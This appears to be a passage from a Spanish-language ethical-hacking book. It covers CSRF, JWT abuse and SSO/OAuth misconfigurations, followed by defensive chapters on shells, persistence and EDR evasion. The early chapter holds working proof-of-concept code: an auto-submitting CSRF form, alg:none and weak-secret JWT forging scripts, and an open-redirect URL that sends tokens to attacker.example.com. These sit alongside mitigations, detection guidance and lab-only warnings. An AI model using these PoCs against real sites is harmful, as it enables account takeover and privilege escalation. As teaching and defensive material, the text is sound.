**CSRF, abuso de JWT, y malas configuraciones de SSO (PoC en Python)**

**Objetivos**

* Entender vectores y condiciones que permiten bypass de controles de autenticación y autorización: CSRF, manipulación de tokens JWT, y errores en SSO/OAuth/OIDC.
* Aprender metodologías para identificar y validar estos fallos en un entorno controlado.
* Proveer pruebas de concepto (PoC) seguras y educacionales en Python/HTML para laboratorios autorizados.
* Ofrecer recomendaciones de mitigación técnicas y operativas, y checklists para evaluación y remediación.

> **Aviso ético-legal (obligatorio).**
> Todo lo aquí mostrado es **únicamente** para entornos de laboratorio o activos para los que posees autorización escrita. Intentar bypass de autenticación en sistemas reales sin permiso es ilegal y peligroso. Antes de realizar pruebas: obtener RoE, snapshots, contacto de emergencia y documentar evidencias.

---

## 1. Panorama conceptual rápido

### CSRF (Cross-Site Request Forgery)

CSRF ocurre cuando un sitio confía en que una petición procedente del navegador de un usuario autenticado es legítima. Un atacante induce al navegador a enviar una petición (GET/POST/PUT/DELETE) que ejecuta acciones en nombre del usuario (por ejemplo: cambiar email, transferir fondos) si no existen protecciones adecuadas (tokens anti-CSRF, comprobación del `Origin`/`Referer`, SameSite cookies).

### JWT abuse

JWT (JSON Web Tokens) son tokens compactos que soportan firmas (HS256/HMAC o RS256/RSA). Fallos típicos:

* Confianza en `alg: none` o aceptación de tokens sin validar algoritmo.
* Validar sólo la firma sin comprobar `aud` (audience), `iss` (issuer), `exp` (expiration) o `nbf`.
* Uso de claves débiles para HMAC (HS256) que permiten forjar tokens.
* Reutilización de public/private keys o publicar secretos por error en repositorios.

### SSO/OAuth/OIDC misconfigurations

Errores comunes:

* `redirect_uri` demasiado permisivo (open redirect) que permite robar tokens.
* No validar `state` para CSRF en OAuth flows.
* Confianza en `id_token` sin validar `nonce`, `aud` o `iss`.
* Confundir `access_token` con `id_token` o usar tokens insuficientemente restringidos.

---

## 2. Detección: señales que buscar

* Formularios sin token CSRF, cookies sin `SameSite` y cookies autenticadas sin `HttpOnly`.
* Servicios que aceptan JWT sin validar `alg` / sin comprobación `aud`/`iss`.
* OAuth clients con `redirect_uri` que aceptan wildcards o dominios controlables por el usuario.
* Respuestas que no distinguen entre GET y POST para acciones sensibles.

Herramientas útiles en laboratorio: Burp Suite (Intercept/Repeater), curl, requests (Python), jwt.io (decoding), y scripts que automatizan checks de `alg:none` o missing claims.

---

## 3. PoC — CSRF (HTML simple para laboratorio)

Situación típica: endpoint `POST /user/email` cambia email sin token CSRF y cookie de sesión es automática.

Archivo `csrf_poC.html` (cargar en un navegador diferente al del usuario objetivo en laboratorio; el navegador del usuario debe estar logueado en el site objetivo para que funcione):

```html
<!doctype html>
<html>
  <body>
    <h3>PoC CSRF (lab)</h3>
    <form action="https://vulnerable.example.com/user/email" method="POST" id="csrf">
      <input type="hidden" name="email" value="attacker+test@example.com">
    </form>
    <script>
      // Auto-submit to trigger CSRF if victim is authenticated in vulnerable.example.com
      document.getElementById('csrf').submit();
    </script>
    <p>Envía petición POST a vulnerable.example.com (solo en laboratorio).</p>
  </body>
</html>
```

**Explicación:** si `vulnerable.example.com` acepta la petición sin token anti-CSRF ni comprobación de `Origin/Referer`, y la cookie de sesión del usuario está presente, la acción se ejecutará en nombre del usuario.

**Mitigación CSRF (resumen):**

* Implementar token anti-CSRF por sesión/campo (double-submit cookie o token en formulario).
* Validar `Origin` y `Referer` en requests que cambien estado.
* Marcar cookies de sesión como `SameSite=Strict`/`Lax` cuando sea viable.
* Requerir re-autenticación o MFA para operaciones críticas.

---

## 4. PoC — Abuso de JWT (Python)

Tres PoC educacionales (decodificar, `alg:none` y re-firmar con clave conocida). Ejecutar solo en tokens de laboratorio.

### 1) Decodificar sin verificar (inspección)

```python
# jwt_inspect.py
import base64, json
def b64d(s): return json.loads(base64.urlsafe_b64decode(s + '='*((4-len(s)%4)%4)).decode('utf-8'))
token = "<TOKEN_DE_LAB>"
hdr, payload, sig = token.split('.')
print("HEADER:", b64d(hdr))
print("PAYLOAD:", b64d(payload))
```

### 2) `alg:none` PoC (si servidor acepta alg:none — raramente hoy)

```python
# jwt_none_poC.py
import base64, json
def b64u(x):
    return base64.urlsafe_b64encode(json.dumps(x).encode()).decode().rstrip('=')

# Cambiar claims a privilegios de admin
header = {"typ":"JWT","alg":"none"}
payload = {"sub":"lab-user","role":"admin","iat":1630000000}
token = b64u(header) + "." + b64u(payload) + "."
print("PoC token (alg:none):", token)
# En entorno/servidor vulnerable, este token podría ser aceptado si no se valida alg.
```

### 3) Re-firmar HS256 con clave conocida (laboratorio)

Si encuentras una clave débil/obvia (ej: `secret123`), puedes generar un token válido:

```python
# jwt_hs256_forge.py
import jwt, time
secret = "secret123"  # solo en laboratorio; no usar en producción
payload = {"sub":"lab-user","role":"admin","iat":int(time.time()), "exp": int(time.time())+3600}
token = jwt.encode(payload, secret, algorithm="HS256")
print("Forged token:", token)
```

**Notas importantes:**

* Muchos servidores usan RS256 (asymmetric). Un error clásico fue aceptar HS256 signed tokens by using the server's RSA public key as the HMAC key — detectarlo y explotarlo requiere confirmación manual.
* Nunca pruebes forjar tokens en sistemas no autorizados. Para tests defensivos, automatiza detección de `alg:none` y revisa la lista de claims requeridos (`aud`, `iss`, `exp`).

**Mitigaciones JWT:**

* Rechazar `alg:none` y exigir algoritmos de firma esperados.
* Validar `iss`, `aud`, `exp`, `nbf`, `nonce` y `sub` según el flujo.
* Usar claves HMAC fuertes o pares RSA/ECDSA correctamente gestionados.
* No aceptar HS256 if the server expects RS256 without strict checks; keep secrets out of repos.

---

## 5. PoC — SSO / OAuth / Open Redirect (Python + curl)

### Open redirect en `redirect_uri`

Si el cliente registra `https://example.com/callback?rd=` y no valida el `rd` puede redirigir a arbitrary host. PoC conceptual:

```bash
# Intento de auth redirect a dominio controlado por atacante (solo laboratorio)
# El usuario es redirigido al IdP y tras login el IdP redirige al callback con token.
open "https://idp.example.com/auth?client_id=lab&redirect_uri=https://example.com/callback?rd=https://attacker.example.com/collect"
```

**PoC técnico:** probar manualmente si `redirect_uri` admite tu dominio controlado — si lo hace y el IdP devuelve tokens a esa URL, el flujo puede ser abusado.

### CSRF en OAuth (`state` inexistente)

`state` debe ser aleatorio, por sesión y verificado tras redirección. PoC: si `state` es fijo o ausente, un atacante puede forjar enlaces que provoquen login en cliente con attacker-controlled redirect.

**Mitigaciones SSO/OAuth:**

* Registrar `redirect_uri` exactos (no comodines) y validar strict match.
* Usar `state` y `nonce` vinculados a sesión; validar tras callback.
* Validar `aud`/`iss` en `id_token` y comprobar `nonce`.
* Limitar scopes y usar PKCE para public clients.

---

## 6. Automatización de detección rápida (script conceptual)

`jwt_checks.py` — detecta `alg:none`, falta de `exp`, y decodifica tokens (lab):

```python
#!/usr/bin/env python3
import jwt, sys, requests

def decode_no_verify(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        return {"error": str(e)}

def check_alg_none(token):
    header = jwt.get_unverified_header(token)
    return header.get('alg','').lower() == 'none'

def find_tokens_in_response(url):
    r = requests.get(url, timeout=10)
    # heurística simple
    import re
    for t in re.findall(r"[A-Za-z0-9\-\_\=]+\.[A-Za-z0-9\-\_\=]+\.[A-Za-z0-9\-\_\=]*", r.text):
        yield t

if __name__ == "__main__":
    target = sys.argv[1]
    for t in find_tokens_in_response(target):
        print("Found token:", t)
        print("Alg none?", check_alg_none(t))
        print("Decoded payload:", decode_no_verify(t))
```

**Uso:** solo en responses de tu lab app; no busques tokens en sitios de terceros.

---

## 7. Buenas prácticas para pruebas (procedural)

* Automatiza detección de problemas (alg:none, missing exp, weak secret) pero exige revisión humana antes de intentar explotación.
* Mantén artefactos de prueba (tokens forjados, PoC HTML) en repositorio privado del proyecto y marca como `lab-only`.
* Notifica al cliente antes de las pruebas SSO que impliquen redirecciones o cambios de tokens.
* Para flujos OAuth/OIDC, registrar y auditar todos los `redirect_uri` y las aplicaciones cliente.

---

## 8. Checklist de mitigación rápida

* [ ] Rechazar `alg:none` y establecer whitelist de algoritmos.
* [ ] Validar `iss`, `aud`, `exp`, `nbf`, `nonce` y `iat`.
* [ ] Cookies: `HttpOnly`, `Secure`, `SameSite=Lax/Strict` cuando proceda.
* [ ] Implementar token anti-CSRF y comprobar `Origin`/`Referer`.
* [ ] Registrar `redirect_uri` exactos en OAuth clients; exigir `state` y `nonce`.
* [ ] Monitorizar uso inusual de tokens y rotación de claves.
* [ ] Revisar repositorios por secretos (secrets scanning).
* [ ] Revisar logs y generar alertas por tokens forjados, token reuse, o tokens con claims inválidos.

---

## 9. Ejemplos de reporte técnico (resumen)

Para cada hallazgo incluye:

* Descripción, PoC (HTML/requests/tokens), impacto (privilege escalation, account takeover), evidencia (request/response), pasos de mitigación y prioridad.
* Si se desarrolló PoC, adjuntar `lab_only/` con scripts y asegurar control de acceso.
* Recomendar pruebas de regresión tras mitigación (automatizadas).

---

## Parte IV — Post-explotación: mantenimiento y movimiento lateral

# Capítulo 23 — Shells y despliegue de agentes

**netcat, socat, meterpreter; técnicas para shells “estables”. (Nota importante sobre persistencia y seguridad)**

**Objetivos**

* Explicar conceptualmente qué son los reverse/interactive shells y por qué se usan en pruebas de Red Team.
* Comparar herramientas habituales (netcat, socat, meterpreter) a nivel funcional y sus diferencias operativas.
* Describir, sin instrucciones operativas paso a paso, los factores que ayudan a mantener una sesión interactiva estable (canales confiables, keep-alive, reintentos) y las razones por las que la persistencia es delicada.
* Priorizar la ética: no se ofrecerán scripts o técnicas accionables para desplegar *backdoors persistentes* ni recetas que faciliten intrusión o persistencia fuera de un laboratorio autorizado.
* Proveer prácticas seguras de laboratorio, detección, mitigación y checklist para defensores y testers responsables.

---

## Aviso ético-legal (lectura obligatoria)

Este capítulo **no** contiene comandos, scripts ni procedimientos accionables para desplegar persistencia o backdoors en sistemas reales. Instrucciones prácticas que faciliten la instalación de agentes persistentes o la evasión de detección pueden ser mal utilizadas y, en muchos países, son ilegales sin autorización. Por eso **no** ofreceré código ni pasos reproducibles para establecer reverse shells persistentes o mantener agentes maliciosos. En su lugar encontrarás explicaciones conceptuales, prácticas defensivas y pautas para realizar ejercicios controlados y seguros en laboratorios con autorización.

---

## 1 — ¿Qué es un “shell” en el contexto de Red Team?

Un *shell* es una interfaz remota que permite ejecutar comandos en una máquina objetivo. Dependiendo del método, puede ser:

* **Bind shell:** el objetivo abre un puerto y escucha; el atacante se conecta a él.
* **Reverse shell:** la máquina objetivo abre una conexión saliente hacia un host controlado por el operador y entrega una interfaz de comandos.
* **Interactive shell vs. non-interactive:** shells que permiten un TTY interactivo (stdin/stdout/pty) frente a ejecuciones puntuales de comandos.
* **Agentes/C2:** marcos más completos (meterpreter, agentes de frameworks C2) ofrecen canal seguro, transporte, archivos, pivoteo y post-explotación.

---

## 2 — Herramientas: panorama funcional (sin comandos)

* **Netcat (nc):** utilidad simple para leer/escribir conexiones TCP/UDP; sirve para prototipos y pruebas locales. Es extremadamente versátil pero básico.
* **Socat:** similar a netcat pero más robusto y con más opciones de transformación de flujos; útil para tunelización, redireccionamiento y multiplexado.
* **Meterpreter (Metasploit):** agente más avanzado que proporciona shell interactiva, subida/descarga de ficheros, ejecución de módulos, pivoteo y funcionalidades post-explotación; suele funcionar sobre un canal cifrado y gestionado por el framework.
* **Agentes C2 modernos:** sistemas como Cobalt Strike, Empire, Sliver o marcos open-source que implementan persistencia, comunicaciones cifradas, beacons y módulos para ejecución remota. (Estos son poderosos y su uso siempre debe estar restringido a entornos autorizados.)

Explicación clave: las herramientas no son intrínsecamente “malas”, su uso y el contexto legal/ético determinan si la actividad es legítima.

---

## 3 — Factores que hacen “estable” una sesión remota (conceptual)

En lugar de proporcionar recetas, describo los factores que profesionales consideran para mantener una sesión estable en entornos controlados:

* **Canal de transporte confiable:** elegir TCP vs UDP según la red; considerar túneles TLS/SSH para fiabilidad y cifrado.
* **Mecanismos de reintento y reconexión:** agentes que reintentan con backoff cuando la conexión se corta.
* **Keep-alive / heartbeats:** señales periódicas que confirman la disponibilidad del agente y ayudan a detectar desconexiones.
* **Multiplexado y control de flujo:** uso de sesiones multiplexadas para reconectar sin perder contexto.
* **Robustez frente a NAT/Firewall:** estrategias para operar detrás de NAT (conexiones salientes, polling, beaconing).
* **Minimización de la huella:** reducir frecuencias de polling, usar intervalos aleatorios y limitar tamaño del tráfico para no disparar alertas.
* **Manejo de TTY:** técnicas para solicitar un pseudo-TTY interactivo cuando se requiera línea de comandos completa (esto es un detalle técnico, no se presentarán implementaciones).

Estos son principios arquitectónicos — útiles para entender por qué algunos agentes “permanecen vivos” y otros no— sin traducirlos a instrucciones explotables.

---

## 4 — Persistencia: por qué es delicado y por qué no la incluimos

La persistencia (configurar un agente para que sobreviva reinicios y permanezca sin intervención) es la línea que separa una prueba puntual de una intrusión con impacto sostenido. Los motivos para no enseñar técnicas de persistencia accionables:

* **Uso dual:** la misma técnica puede servir a un auditor o a un atacante criminal.
* **Daño potencial:** la persistencia no autorizada compromete la integridad y disponibilidad del sistema y la privacidad de usuarios.
* **Legalidad:** en muchos países la instalación de software persistente en sistemas sin consentimiento es delito.

Por eso, en un libro ético, las pruebas que impliquen persistencia deben ser **sólo** descritas conceptualmente y ejecutadas únicamente en entornos de laboratorio controlados con autorización escrita, y siempre documentadas y temporales.

---

## 5 — Laboratorio seguro: cómo practicar sin riesgo (guía)

Si vas a experimentar con shells/agents en formación o pruebas, sigue esta guía (procedimental, sin comandos peligrosos):

1. **Entorno aislado:** usa máquinas virtuales dentro de una red completamente aislada (no enrutada hacia/desde Internet), o crea un laboratorio en VLAN que sea inaccesible desde la red corporativa.
2. **Snapshots y backups:** toma snapshot antes de cada experimento para poder revertir cambios.
3. **Limita el alcance:** identifica claramente qué VMs/hosts están en scope y documenta fecha/hora/operador.
4. **No persistas fuera del lab:** cualquier agente desplegado debe ser eliminado al terminar; no automatices persistencia.
5. **Auditoría y logging:** habilita captura de pcap en la red del laboratorio, registra procesos/artifacts y conserva logs en servidor separado.
6. **Tiempo limitado:** los agentes deben ejecutarse con caducidad (manual) y siempre eliminarse.
7. **Pruebas de detección:** combina el ejercicio con equipos de detección para validar reglas EDR/IDS.
8. **Documentación y reporte:** guarda evidencia, pasos ejecutados y lecciones aprendidas; incluye recomendaciones de mitigación.

---

## 6 — Detección y mitigación (para Blue Teams)

Este apartado es clave para un libro ético: cómo detectar y neutralizar shells y agentes.

### Indicadores de compromiso y señales a monitorizar

* **Conexiones salientes inusuales:** procesos que abren conexiones TCP/UDP hacia IPs/rangos no habituales, especialmente conexiones de larga duración.
* **Procesos hijos atípicos:** shells o interpretes (sh, bash, cmd.exe, powershell) invocados por procesos inusuales (p. ej. servicios web).
* **Elevado tráfico criptado inesperado:** flujos TLS hacia destinos desconocidos en puertos no estándar.
* **Beaconing/periodicidad:** patrones regulares de conexión (beacon intervals) que sugieren un agente.
* **Ejecuciones programadas no reconocidas:** entradas en cron, systemd timers, tareas programadas; revisa cambios en los ficheros de configuración.
* **Artefactos en sistema de ficheros:** binarios nuevos en carpetas no habituales, archivos con timestamps coincidentes.
* **Comportamiento lateral:** uso repentino de herramientas administrativas (SMB, WMI, PsExec) desde hosts no administradores.

### Herramientas y controles defensivos

* **Egress filtering / control de salidas:** bloquear conexiones salientes no aprobadas y usar proxies obligatorios.
* **EDR y detección de comportamiento:** monitorizar creación de procesos, lineas de comando sospechosas, shells embebidos en procesos.
* **Network IDS / TLS inspection (si aplicable):** detección de beaconing y anomalías en estadísticas de flujos.
* **Restricción de interpretes:** aplicación whitelists o AppLocker/SELinux para limitar qué binarios pueden ejecutar shells.
* **Hardened logging y SIEM:** correlación de eventos (procesos, autenticación, red).
* **Baselines y alertas:** establecer comportamiento normal por host y alertar desviaciones.

### Respuesta a incidentes (resumen)

1. Aislar el host (network quarantine).
2. Tomar imágenes forenses (memoria y disco) antes de modificaciones.
3. Analizar conexiones salientes y artefactos.
4. Remediar con rollback desde snapshot o reinstalación, rotar credenciales.
5. Revisar alcance de compromiso y notificar a stakeholders.

---

## 7 — Buenas prácticas éticas para Red Teamers

* Siempre operar con **autorización escrita y delimitada**.
* Evitar persistencia prolongada; si el cliente solicita pruebas que impliquen persistencia, documentar y acordar explícitamente ventana y limpieza.
* Priorizar técnicas que permitan **reversibilidad total** (snapshots, instalación temporal).
* Coordinar ejercicios con el equipo defensor: generar pruebas conjuntas que mejoren detección y remediación.
* Mantener evidencia cifrada y accesible sólo a personal autorizado.
* No reutilizar artefactos de pruebas en entornos de producción reales.

---

## 8 — Checklist operativo (resumen rápido)

* [ ] Autorización escrita y RoE específicos para experiments.
* [ ] Laboratorio aislado o redes VLAN separadas.
* [ ] Snapshots antes de pruebas.
* [ ] Agentes temporales, sin persistencia automática.
* [ ] Logging de red y hosts habilitado.
* [ ] Procedimiento de limpieza y rollback documentado.
* [ ] Verificación con equipo Blue Team de detección/remediación.
* [ ] Informe con evidencias, IOCs y recomendaciones defensivas.

---

## 9 — Recursos recomendados (lecturas y herramientas defensivas)

* Documentación oficial de EDR/AV del proveedor para detección de shells y comportamiento remoto.
* Publicaciones y whitepapers de incident response sobre análisis de beaconing y detección de C2.
* Herramientas de análisis forense y de red: Zeek/Bro, Suricata, Wireshark, Sysmon (Windows), auditd (Linux), ELK/Siem.
* Frameworks de pruebas y aprendizaje en entornos cerrados (laboratorios CTF, máquinas intencionalmente vulnerables).

---

## Conclusión

Los shells y los agentes son una pieza central en ejercicios de Red Team cuando se usan de forma responsable y en entornos controlados. Sin embargo, la línea entre una prueba legítima y una intrusión real está en la autorización, la reversibilidad y el control. Por ese motivo **no** se incluyen en este capítulo instrucciones prácticas para desplegar persistencia o backdoors. En su lugar ofrezco un marco conceptual, prácticas de laboratorio seguras, y un conjunto de contramedidas y detección que sirven tanto a ofensores éticos como a defensores.

---

# Capítulo 24 — Persistencia en sistemas Windows y Linux (detección, auditoría y remediación)

**Objetivo**
Entender los mecanismos comunes que los atacantes usan para persistir; aprender a detectarlos, auditar configuraciones, recolectar evidencia y remediar de forma segura. Incluir guías de hardening y ejercicios de laboratorio seguros para practicar detección y respuesta sin instalar backdoors reales.

> **Aviso:** este capítulo no contiene instrucciones ni scripts para crear persistencia. Todos los ejemplos de código son defensivos (listar/analizar) o para laboratorio controlado y no instalan agentes persistentes en sistemas de terceros.

---

## 1. Visión general — qué es persistencia y por qué importa

Persistencia es cualquier mecanismo que permite a un actor (legítimo o malicioso) mantener ejecución o acceso tras reinicios, cierres de sesión o cambios temporales. Para defensores, detectarla tempranamente es clave para contener y erradicar compromisos. Los vectores comunes:

**En Windows**

* Servicios de sistema (service binaries, ImagePath en registry).
* Tareas programadas (Scheduled Tasks / Task Scheduler).
* Run keys en registry (`HKLM\...\Run`, `HKCU\...\RunOnce`, etc.).
* WMI / Event Subscription.
* DLL hijacking / AppInit_DLLs / COM hijack.
* Hooks, drivers, GPOs mal configuradas.

**En Linux**

* `cron` (crontab de usuarios, `/etc/cron.*`, `/var/spool/cron`).
* `systemd` units (persistentes en `/etc/systemd/system`, timers).
* Init scripts (`/etc/init.d/`), `rc.local`.
* `@reboot` cron entries.
* User profile scripts (`~/.bashrc`, `~/.profile`, `~/.config/autostart` en entornos gráficos).
* Kernel modules (load on boot) y servicios instalados.

---

## 2. Principios defensivos y procedimientos seguros

Antes de remediar, siempre:

1. **Recolecta evidencia forense:** memoria y disco (si posible) antes de alterar.
2. **Aisla el sistema (quarantine)** si existe riesgo de movimiento lateral.
3. **Documenta** timestamps, hashes de archivos sospechosos, procesos, conexiones de red.
4. **Prioriza**: ¿es host crítico? ¿afecta producción? Decide rollback vs. rebuild.
5. **Remediación con pruebas:** si vas a modificar, hazlo en ventanas controladas y con snapshot/imagen completa.

---

## 3. Detección y auditoría (comandos y prácticas defensivas)

A continuación se muestran técnicas defensivas para **listar y auditar** mecanismos de persistencia. Estas acciones son legítimas para administradores y equipos IR.

### 3.1 Linux — auditoría y búsqueda de anomalías (conceptos y ejemplos de lectura)

**Qué buscar**

* Entradas inusuales en crontabs de usuarios y en `/etc/cron.*`.
* Unidades systemd nuevas en `/etc/systemd/system` o `/lib/systemd/system` con `ExecStart` apuntando a binarios desconocidos.
* `/etc/rc.local`, `~/.bashrc`, `~/.profile`, `~/.config/autostart` con invocaciones extrañas.
* Archivos con permisos 777 o ejecutables en rutas inusuales.
* Modulos kernel no reconocidos (`lsmod`) o hooks.
* Tiempos de creación/mtime inusuales.

**Ejemplos defensivos (lectura / listados)**

* Listar crontabs de todos los usuarios (leer, no modificar):

  * Revisar `/var/spool/cron/crontabs/` y `/etc/cron.*/` (depende distro).
* Revisar systemd unit files:

  * Listar unidades habilitadas: `systemctl list-unit-files --type=service` (interpreta salida para ver enabled/disabled).
  * Ver contenido de unidades en `/etc/systemd/system/` para `ExecStart` y `User` fields.
* Buscar `@reboot` en crontabs:

  * Escanear crontab files con `grep -R "@reboot" /var/spool/cron* /etc/cron* /home/*/.*/` (solo lectura).

> Nota: los comandos anteriores son de inspección; evita editar antes de recopilar evidencia.

### 3.2 Windows — auditoría y búsqueda de anomalías (conceptos y ejemplos de lectura)

**Qué buscar**

* Servicios con `ImagePath` que apunten a binarios nuevos o ubicaciones temporales.
* Scheduled Tasks con triggers en `At startup` o `At logon` y acciones desconocidas.
* Run/RunOnce registry keys con comandos extraños.
* WMI permanent event subscriptions.
* DLLs en `C:\Windows\System32\` o en carpetas de usuario con nombres similares a legítimos.

**Ejemplos defensivos (lectura / listados)**

* Listar servicios (solo mostrar):

  * `sc queryex type= service state= all` o desde PowerShell: `Get-Service | Select-Object -Property Name,DisplayName,Status`.
  * Para ver ImagePath (definitivo para auditoría): `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* | Select-Object PSChildName, ImagePath` (PowerShell, solo lectura).
* Listar Scheduled Tasks (PowerShell):

  * `Get-ScheduledTask | Select-Object TaskName, TaskPath, State` y para detalle `Get-ScheduledTaskInfo -TaskName "Nombre"`.
* Registry Run keys (PowerShell reading):

  * `Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"` y the HKCU counterpart.
* Listar WMI subscriptions:

  * `Get-WmiObject -Namespace root\subscription -Class __EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding`.

> Reitera: **solo leer** antes de modificar; para IR primero colectar imagen forense si el caso lo requiere.

---

## 4. Indicadores de compromiso (IOCs) y patrones anómalos

* Ejecutables con hashes desconocidos o firmados por certificados no confiables.
* Persistencia en rutas temporales (p. ej. `%TEMP%`, `/tmp`) o con nombres que imitan binarios legítimos con diferencias sutiles.
* Tasks/Units creadas en horarios atípicos, con `CreatedBy` que no corresponde al administrador.
* Procesos hijos extraños de servicios web (p. ej. `apache` spawn shells).
* Conexiones salientes persistentes desde procesos no de red.
* Presencia de scripts ofuscados en crontabs o registros.

---

## 5. Remediación segura y pasos recomendados

1. **Recolectar evidencia** (memoria, pcap, lista de procesos, archivos sospechosos con hashes).
2. **Aislar** (network quarantine) si riesgo de lateral movement.
3. **Analizar**: determinar alcance, persistencia y vectores usados.
4. **Plan de remediación**:

   * Para hosts no críticos: snapshot -> cleanup -> validar -> reintegrar.
   * Para hosts críticos: considerar rebuild desde golden image si el alcance es incierto.
5. **Rotar credenciales** asociadas (service accounts, keys).
6. **Harden** configuraciones (ver sección siguiente).
7. **Revisión post-remediation**: ejecutar detección completa para validar ausencia de arifacts.
8. **Documentar** todo para lecciones aprendidas y posible reporte legal.

---

## 6. Hardening: mitigaciones y controles preventivos

**Linux**

* Minimizar servicios habilitados; usar `systemd` permissions and `ProtectSystem`, `ProtectHome`, `NoNewPrivileges`.
* Auditoría y alertas sobre cambios en `/etc/systemd/system`, crontabs y directorios sensibles.
* Restricción de ejecución en `cron` por listas blancas cuando sea posible.
* Integridad de archivos: usar `AIDE`/`Tripwire` o baselines con hashes.
* Monitoring: osquery/Elastic/Zeek para detectar creación de timers/units/cron entries.

**Windows**

* Policies: AppLocker/WDAC para limitar binarios que pueden ejecutarse.
* Sysmon configurado para logging de creación de servicios, scheduled tasks, creación de procesos y cambios en el registro.
* Auditar y alertar sobre actividades inusuales en Run keys, creación de servicios y cambios en `schtasks`.
* Endpoint protection y EDR que detecte comportamientos tipo beaconing, persistencia y privilegio escalado.

---

## 7. Detección automatizada — ejemplos defensivos en Python

> Estos scripts **solo** listan/analizan artefactos y generan reportes; no crean ni modifican persistencia.

### 7.1 Script defensivo para Linux — listar cron y systemd units (Python)

Este script recorre ubicaciones comunes y genera un CSV/JSON para auditoría.

```python
#!/usr/bin/env python3
"""
audit_persistence_linux.py
- Lee crontab files y systemd unit files (solo lectura) y genera un resumen JSON.
- Uso: python3 audit_persistence_linux.py /ruta/salida
"""
import os, json, glob, pwd, sys, time

outdir = sys.argv[1] if len(sys.argv)>1 else "./audit_out"
os.makedirs(outdir, exist_ok=True)

def read_file(path):
    try:
        with open(path,'r',encoding='utf-8',errors='ignore') as f:
            return f.read()
    except Exception as e:
        return ""

summary = {"timestamp": time.time(), "crons": [], "systemd_units": []}

# crontabs (system-wide and per-user)
cron_paths = ["/etc/crontab","/etc/cron.d"] + glob.glob("/var/spool/cron/crontabs/*")
for p in cron_paths:
    if os.path.exists(p):
        content = read_file(p)
        summary["crons"].append({"path": p, "size": len(content), "sample": content[:1000]})

# systemd unit files common paths
unit_paths = glob.glob("/etc/systemd/system/*.service") + glob.glob("/lib/systemd/system/*.service") + glob.glob("/usr/lib/systemd/system/*.service")
for p in unit_paths:
    if os.path.exists(p):
        content = read_file(p)
        # quick heuristic: look for ExecStart
        execstart = ""
        for line in content.splitlines():
            if line.strip().startswith("ExecStart"):
                execstart = line.strip()
                break
        summary["systemd_units"].append({"path": p, "execstart": execstart, "size": len(content)})

outf = os.path.join(outdir,"linux_persistence_audit.json")
with open(outf,'w',encoding='utf-8') as fh:
    json.dump(summary, fh, indent=2)
print("Audit saved to", outf)
```

Este script es seguro de correr en tus hosts y da un reporte para revisión.

### 7.2 PowerShell defensive snippets — listar Scheduled Tasks y Run keys (concepto)

(Se muestra el comando PowerShell para que un administrador lo ejecute; no modifica el sistema.)

* Listar Scheduled Tasks:

  ```powershell
  Get-ScheduledTask | Select TaskName,TaskPath,State | ConvertTo-Json
  ```
* Listar Run keys:

  ```powershell
  Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | ConvertTo-Json
  Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | ConvertTo-Json
  ```

Estos comandos producen JSON que se puede ingerir en SIEM para alertas y análisis.

---

## 8. Ejercicios de laboratorio seguros (sin persistencia real)

Diseña VMs aisladas que imiten artefactos de persistencia **pero sin instalar backdoors**:

* **Ejercicio A — Simular artefacto en archivo (solo lectura):**
  Crea un directorio de ejemplo que contenga unit files o crontab text files (archivos estáticos) y usa el script `audit_persistence_linux.py` para detectarlos y generar alertas. No los habilites en systemd ni los pongas en cron; son archivos de prueba para detección.

* **Ejercicio B — Simular tareas programadas (registro):**
  En una VM de laboratorio, crea ficheros `.task` con formato JSON que representen tareas y haz que el equipo de detección consuma esos ficheros para entrenar firmas y reglas SIEM. No registrar como Scheduled Task real.

* **Ejercicio C — Detección con Sysmon/Osquery:**
  Instala Sysmon en Windows de laboratorio con una configuración que loguee creación de servicios y scheduled tasks; genera eventos simulados (sin persistir) y valida reglas de SIEM que detecten patrones. Para Linux usa osquery y crea entradas simuladas en tablas virtuales.

Estos ejercicios permiten entrenar detección y respuesta **sin** crear persistencia que sobreviva reinicios reales ni dejar puertas abiertas.

---

## 9. Checklist rápido de auditoría y respuesta

* [ ] Ejecutar script de auditoría (Linux) y coleccionar JSON.
* [ ] Ejecutar comandos PowerShell para listar Tasks/Run keys y exportar a SIEM.
* [ ] Comparar unidades/tareas con listas blancas de aplicaciones aprobadas.
* [ ] Revisar hashes de binarios referenciados por units/tasks contra baselines.
* [ ] Verificar timestamps y propietarios de archivos (/etc/systemd/system, /var/spool/cron).
* [ ] Tomar imagen forense si se sospecha compromiso.
* [ ] Si se remedia, rotar credenciales asociadas y revisar logs para lateral movement.
* [ ] Documentar acciones y aplicar hardening recomendado.

---

## 10. Recursos y plantillas útiles

* Plantilla Sysmon (configuración) para detectar creación de servicios, cambios en el registry Run keys y creación de scheduled tasks.
* Configuraciones osquery para cotejar crontabs y units en Linux.
* Playbook de IR: pasos de recolección, aislamiento, evidencia, remediación y cierre.
* Repositorio con scripts defensivos (audit_persistence_linux.py y snippets PowerShell) — puedo generar esto en una carpeta si quieres.

---

## Conclusión

Persistencia es un área crítica tanto para ofensiva como para defensiva. Por razones de seguridad y ética no se presentan técnicas ni scripts que enseñen a instalar persistencia. En cambio, este capítulo te da todo lo necesario para **detectar, auditar, mitigar y prevenir** mecanismos de persistencia en Windows y Linux, además de ejercicios seguros de laboratorio para entrenar equipos de detección.

---

# Capítulo 25 — Evasión de EDR y anti-forense: detección, mitigación y respuesta

**Enfoque:** detección, medidas defensivas, análisis forense e ejercicios de laboratorio seguros.
**No incluye** instrucciones que enseñen cómo evadir detecciones, ofuscar payloads para eludir controles, o realizar timestomping/anti-forensics prácticos.

---

## Objetivos del capítulo

* Entender las categorías y señales de evasión y anti-forensics.
* Identificar indicadores de compromiso (IOCs) y anomalías que sugieren intento de ocultamiento.
* Proponer reglas de detección y configuraciones defensivas (Sysmon, EDR, network monitoring, SIEM).
* Definir workflows de respuesta e investigación forense.
* Sugerir ejercicios de laboratorio seguros para entrenar detección sin enseñar técnicas ofensivas.

---

## 1. Panorama: qué entendemos por “evasión” y “anti-forense”

* **Evasión de EDR:** técnicas para evitar ser detectado por soluciones de endpoint (ocultar procesos, evadir hooks, uso de procesos legítimos para ejecutar código, minimizar artefactos en disco).
